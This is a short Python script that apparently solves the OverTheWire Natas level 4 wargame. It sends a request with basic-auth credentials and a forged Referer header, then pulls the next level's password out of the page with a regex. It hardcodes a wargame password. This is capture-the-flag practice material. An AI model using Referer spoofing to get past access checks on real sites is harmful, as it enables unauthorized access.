import requests
import re

usrname = 'natas4'
passwd = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

headers = {"Referer" : "http://natas5.natas.labs.overthewire.org/"}

url = "http://%s.natas.labs.overthewire.org/" % usrname

response = requests.get(url, auth = (usrname, passwd), headers = headers)
content = response.text

#print(content)

print re.findall('The password for natas5 is (.*)', content)[0]
